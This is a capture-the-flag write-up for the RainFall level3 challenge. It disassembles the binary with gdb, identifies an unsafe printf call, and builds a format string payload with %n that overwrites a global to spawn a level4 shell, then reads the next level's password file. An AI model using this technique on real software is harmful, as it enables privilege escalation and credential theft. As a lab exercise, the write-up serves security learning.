# Way to level4

When we enter shell `level3`, we can see one excutable file which is `level3`. Let's launch it.

If we launch `level3`, we can assume that it is same as `level2`.
```bash
level3@RainFall:~$ ./level3
dsf
dsf
```

Let's give a look more deeply with `gdb`
```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
---Type <return> to continue, or q <return> to quit---
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini
(gdb) disassemble v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

This result of assembler dump, we are going to look `v()` functions.
It's allocate `0x218(536)` at first, start at `0x208(520)`. And in the middle of this function, it compare `0x40(64)` and `%eax` register. If not equal with that value, the function will be shut down.

Let's attack first, give an enormous bytes to program
```bash
level3@RainFall:~$ python -c 'print"A"*539 + "AAAA"' | ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
We assume, inside of the code, there are some protection of buffer overflow.
I think that we have to find another way to exploit it.

There's `printf()` function in this program, we can use `format string attack`.
Because `printf()` function haves sort of format parameters to print various types.

What is `format string attack`?
When input data interpret string data as a command.

Let's try simple one.

```bash
level3@RainFall:~$ ./level3
%x %x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825 78252078
```
after `200`, it shows esp status before printf function excution.

The payload will be like this
```bash
level3@RainFall:~$ python -c 'print"\x8c\x98\x04\x08%08x%08x%044x%n"' | ./level3
�00000200b7fd1ac0000000000000000000000000000000000000b7ff37d0
Wait what?!

```
First of all, let's figure out why the memory have to place in front of the strings.

```bash
level3@RainFall:~$ objdump -d ./level3 | less
 80484be:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484c4:       89 04 24                mov    %eax,(%esp)
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484d2:       89 04 24                mov    %eax,(%esp)
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
 80484df:       83 f8 40                cmp    $0x40,%eax
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    0x8049880,%eax
 80484e9:       89 c2                   mov    %eax,%edx
 80484eb:       b8 00 86 04 08          mov    $0x8048600,%eax
 80484f0:       89 54 24 0c             mov    %edx,0xc(%esp)
 80484f4:       c7 44 24 08 0c 00 00    movl   $0xc,0x8(%esp)

```

We have to focus on mov and compare after `printf` function.
So we going to put `0x804988c` memory in little median.

Let's exploit it!

```bash
level3@RainFall:~$  python -c 'print"\x8c\x98\x04\x08%08x%08x%044x%n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
�00000200b7fd1ac0000000000000000000000000000000000000b7ff37d0
Wait what?!
whoami
level4
cat /home/user/level4/.pass

```